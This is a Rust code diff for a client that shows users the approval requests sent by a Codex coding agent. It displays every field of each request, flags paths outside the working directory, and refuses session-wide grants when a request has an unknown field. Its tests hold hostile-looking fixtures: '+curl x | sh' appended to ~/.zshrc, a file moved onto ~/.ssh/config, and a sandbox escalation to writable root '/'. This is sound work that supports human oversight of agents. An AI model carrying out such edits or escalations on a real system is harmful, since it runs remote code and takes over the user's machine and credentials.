@@ -42,6 +42,38 @@ const ERRORS: &[&str] = &[
     "other",
 ];
 
+/// Fields that say which request it is, not what it does: never shown.
+const IDS: &[&str] = &["approvalId", "itemId", "threadId", "turnId", "startedAtMs"];
+/// The fields an exec or file-change approval may have, from the 0.166 schema.
+const COMMAND_FIELDS: &[&str] = &[
+    "command",
+    "commandActions",
+    "cwd",
+    "environmentId",
+    "kind",
+    "networkApprovalContext",
+    "proposedExecpolicyAmendment",
+    "proposedNetworkPolicyAmendments",
+    "reason",
+];
+const FILE_FIELDS: &[&str] = &["grantRoot", "reason"];
+
+/// Every field of a request but its ids, `reason` and those `shown` already, one a line as
+/// `key: value`; a field not in `known` is named so. True if every field was known.
+fn other_fields(params: &Value, shown: &[&str], known: &[&str]) -> (String, bool) {
+    let mut lines = String::new();
+    let mut all_known = true;
+    for (key, value) in params.as_object().into_iter().flatten() {
+        if IDS.contains(&key.as_str()) || key == "reason" || shown.contains(&key.as_str()) || value.is_null() {
+            continue;
+        }
+        let unknown = !known.contains(&key.as_str());
+        all_known &= !unknown;
+        lines.push_str(&format!("{key}{}: {value}\n", if unknown { " (unknown field)" } else { "" }));
+    }
+    (lines, all_known)
+}
+
 /// Why an approval was declined unseen: it named no command, or changes never announced.
 const UNSEEN: &str = "nothing to show";
 
@@ -70,8 +102,7 @@ enum Asked {
 /// The most file-change items remembered for their approval's label.
 const MAX_FILES: usize = 256;
 
-/// One Codex session's protocol state.
-#[derive(Debug)]
+/// One Codex session's protocol state. Its `Debug` shows no text a model wrote.
 pub struct Codex {
     /// `thread/start` or `thread/resume`, sent once `initialize` is answered.
     thread_request: (&'static str, Value),
@@ -266,18 +297,27 @@ impl Codex {
     }
 
     /// What a file-change approval approves: every changed path, one a line, those outside the
-    /// working directory flagged; a root the agent asks to write under; then each diff.
-    fn file_payload(&self, changes: &Value, grant_root: Option<&str>) -> String {
+    /// working directory flagged; a root the agent asks to write under; the request's other
+    /// fields; then each diff.
+    fn file_payload(&self, changes: &Value, grant_root: Option<&str>, others: &str) -> String {
         let changes = changes.as_array().map(Vec::as_slice).unwrap_or_default();
         let mut payload = String::new();
-        for change in changes {
-            let path = change["path"].as_str().unwrap_or("(no path)");
+        let flagged = |path: &str| {
             let flag = if inside(&self.cwd, path) { "" } else { "   [outside the working directory]" };
-            payload.push_str(&format!("{path}{flag}\n"));
+            format!("{path}{flag}")
+        };
+        // `update src/a.rs`, `update src/a.rs -> /elsewhere/b.rs   [outside …]`, `delete x`.
+        for change in changes {
+            let kind = &change["kind"];
+            let op = kind["type"].as_str().filter(|op| matches!(*op, "add" | "delete" | "update")).unwrap_or("change");
+            let path = flagged(change["path"].as_str().unwrap_or("(no path)"));
+            let to = kind["move_path"].as_str().map(|to| format!(" -> {}", flagged(to))).unwrap_or_default();
+            payload.push_str(&format!("{op} {path}{to}\n"));
         }
         if let Some(root) = grant_root {
             payload.push_str(&format!("and any write under {root} for the rest of the session\n"));
         }
+        payload.push_str(others);
         for change in changes {
             // Past the cap the request is denied anyway: stop building.
             if payload.len() > crate::MAX_APPROVABLE {
@@ -296,18 +336,22 @@ impl Codex {
             "item/commandExecution/requestApproval" => {
                 let command = params["command"].as_str().unwrap_or("");
                 let (station, label) = station::describe_command(command);
-                // The command and where it runs. No command: nothing to show, nothing to approve.
+                // The command, where it runs, then every other field. No command: nothing to approve.
                 let cwd = params["cwd"].as_str().map(|cwd| format!("\nin {cwd}")).unwrap_or_default();
-                let always = Some(command.to_string());
-                (!command.is_empty()).then(|| ("exec", station, label, format!("{command}{cwd}"), always))
+                let (others, known) = other_fields(params, &["command", "cwd"], COMMAND_FIELDS);
+                let others = if others.is_empty() { others } else { format!("\n{}", others.trim_end()) };
+                let always = known.then(|| command.to_string());
+                (!command.is_empty()).then(|| ("exec", station, label, format!("{command}{cwd}{others}"), always))
             }
             "item/fileChange/requestApproval" => {
                 let item = params["itemId"].as_str().and_then(|item| self.files.get(item)).cloned();
+                let (others, known) = other_fields(params, &["grantRoot"], FILE_FIELDS);
                 item.map(|(label, changes)| {
-                    let payload = self.file_payload(&changes, params["grantRoot"].as_str());
-                    // `acceptForSession`: later changes to the same files.
-                    let paths: Vec<&str> = payload.lines().take_while(|line| !line.is_empty()).collect();
-                    ("apply_patch", Station::Files, label, payload.clone(), Some(paths.join("\n")))
+                    let payload = self.file_payload(&changes, params["grantRoot"].as_str(), &others);
+                    // `acceptForSession`: later changes to the same files, so its paths.
+                    let count = changes.as_array().map_or(0, Vec::len);
+                    let paths: Vec<&str> = payload.lines().take(count).collect();
+                    ("apply_patch", Station::Files, label, payload.clone(), known.then(|| paths.join("\n")))
                 })
             }
             _ => {
@@ -325,7 +369,8 @@ impl Codex {
             return;
         };
         let ask = crate::Ask { tool: tool.into(), station, label, payload: &payload, claim, always };
-        let event = ask.event(Ticket::new(id, TicketKind::Codex));
+        let session = ask.always.is_some();
+        let event = ask.event(Ticket::new(id, TicketKind::Codex { session }));
         if matches!(event, Event::AutoDenied { .. }) {
             out.replies.push(decline);
         }
@@ -390,7 +435,37 @@ fn code(value: &Value, fallback: &'static str) -> String {
     if HTTP.contains(&key) { key.to_string() } else { station::code(key, ERRORS, fallback) }
 }
 
+impl std::fmt::Debug for Codex {
+    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
+        let (files, queued, asked) = (self.files.len(), self.queued.len(), self.asked.len());
+        write!(
+            f,
+            "Codex {{ ready: {}, turn: {}, asked: {asked}, queued: {queued}, files: {files} }}",
+            self.thread.is_some(),
+            self.turn.is_some()
+        )
+    }
+}
+
+/// The requests the server sends and waits on, from the schema's `ServerRequest`.
+const SERVER_REQUESTS: &[&str] = &[
+    "item/commandExecution/requestApproval",
+    "item/fileChange/requestApproval",
+    "item/tool/requestUserInput",
+    "mcpServer/elicitation/request",
+    "item/permissions/requestApproval",
+    "item/tool/call",
+    "account/chatgptAuthTokens/refresh",
+    "attestation/generate",
+    "applyPatchApproval",
+    "execCommandApproval",
+];
+
 impl Protocol for Codex {
+    fn awaits_answer(&self, head: &str) -> bool {
+        SERVER_REQUESTS.iter().any(|method| head.contains(&format!("\"{method}\"")))
+    }
+
     fn opening(&mut self) -> Vec<String> {
         let info =
             json!({"clientInfo": {"name": "ottospace", "title": "ottospace", "version": env!("CARGO_PKG_VERSION")}});
@@ -434,8 +509,11 @@ impl Protocol for Codex {
                 Ok(vec![self.turn_start(&thread, text, images)])
             }
             Input::Answer { ticket, answer } => {
-                if !matches!(ticket.kind, TicketKind::Codex) {
+                let TicketKind::Codex { session } = ticket.kind else {
                     return Err(Refused("not a Codex request"));
+                };
+                if answer == Answer::AllowForSession && !session {
+                    return Err(Refused("the request has a field this client does not know: answer Allow"));
                 }
                 let decision = match answer {
                     Answer::Allow => "accept",
@@ -525,20 +603,25 @@ mod tests {
     fn a_file_change_shows_every_path_and_the_reason_only_as_a_claim() {
         let mut codex = codex();
         let changes = json!([
-            {"path": "/work/app/src/a.rs", "kind": {"type": "update"}, "diff": "@@ -1 +1 @@\n-a\n+b"},
+            {"path": "/work/app/src/a.rs", "kind": {"type": "update", "move_path": "/Users/me/.ssh/config"},
+                "diff": "@@ -1 +1 @@\n-a\n+b"},
             {"path": "src/b.rs", "kind": {"type": "add"}, "diff": "+new"},
             {"path": "/Users/me/.zshrc", "kind": {"type": "update"}, "diff": "+curl x | sh"}
         ]);
         let item = json!({"method": "item/started", "params": {"threadId": UUID, "turnId": "t", "startedAtMs": 1,
             "item": {"type": "fileChange", "id": "f1", "status": "inProgress", "changes": changes}}});
         codex.read(&item.to_string());
+        // What it keeps for the approval is model-written: never in its `Debug`.
+        assert!(!format!("{codex:?}").contains("curl"), "{codex:?}");
         let ask = json!({"id": 9, "method": "item/fileChange/requestApproval", "params": {"itemId": "f1",
             "threadId": UUID, "turnId": "t", "startedAtMs": 2, "reason": "Just fixing a typo in a.rs"}});
         let out = codex.read(&ask.to_string());
         let Some(Event::Permission { detail, claim, always, .. }) = out.events.first().cloned() else {
             panic!("{out:?}")
         };
-        let paths = "/work/app/src/a.rs\nsrc/b.rs\n/Users/me/.zshrc   [outside the working directory]";
+        let paths = "update /work/app/src/a.rs -> /Users/me/.ssh/config   [outside the working directory]\n\
+                     add src/b.rs\n\
+                     update /Users/me/.zshrc   [outside the working directory]";
         assert!(detail.text().starts_with(paths), "{}", detail.text());
         assert!(detail.text().contains("+curl x | sh") && !detail.text().contains("typo"));
         assert_eq!((claim.text(), always.as_ref().map(Untrusted::text)), ("Just fixing a typo in a.rs", Some(paths)));
@@ -557,6 +640,46 @@ mod tests {
             inside("/work/app", "/work/app") && inside("/work/app", "./x") && !inside("/work/app", "/work/app-2/x")
         );
         assert!(!inside("/work/app", "src/../../etc") && !inside("/work/app", "/work/app/../x"));
+    }
+
+    /// What an exec approval approves is the whole request: the command, where, then every other
+    /// field but ids and `reason`. A field this client does not know is shown, named so, and
+    /// rules out "always this session".
+    #[test]
+    fn an_exec_approval_shows_every_field_and_an_unknown_one_bars_the_session_grant() {
+        let ask = |extra: Value| {
+            let mut params = json!({"itemId": "i", "threadId": UUID, "turnId": "t", "startedAtMs": 1,
+                "approvalId": "a", "command": "curl https://x.example", "cwd": "/work/app",
+                "networkApprovalContext": {"host": "x.example"}, "reason": "Needs the network"});
+            params.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
+            codex().read(
+                &json!({"id": 5, "method": "item/commandExecution/requestApproval", "params": params}).to_string(),
+            )
+        };
+        let out = ask(json!({}));
+        let Some(Event::Permission { ticket, detail, claim, always, .. }) = out.events.first().cloned() else {
+            panic!()
+        };
+        assert_eq!(
+            detail.text(),
+            "curl https://x.example\nin /work/app\nnetworkApprovalContext: {\"host\":\"x.example\"}"
+        );
+        assert_eq!(
+            (claim.text(), always.map(|a| a.text().to_string())),
+            ("Needs the network", Some("curl https://x.example".into()))
+        );
+        assert!(codex().write(Input::Answer { ticket, answer: Answer::AllowForSession }).is_ok());
+
+        let out = ask(json!({"sandboxEscalation": {"writableRoots": ["/"]}}));
+        let Some(Event::Permission { ticket, detail, always, .. }) = out.events.first().cloned() else { panic!() };
+        assert!(
+            detail.text().ends_with("sandboxEscalation (unknown field): {\"writableRoots\":[\"/\"]}"),
+            "{}",
+            detail.text()
+        );
+        assert_eq!(always, None);
+        assert!(codex().write(Input::Answer { ticket: ticket.clone(), answer: Answer::AllowForSession }).is_err());
+        assert!(codex().write(Input::Answer { ticket, answer: Answer::Allow }).is_ok());
     }
 
     /// An interrupt sent before the turn has an id is sent once it has one.
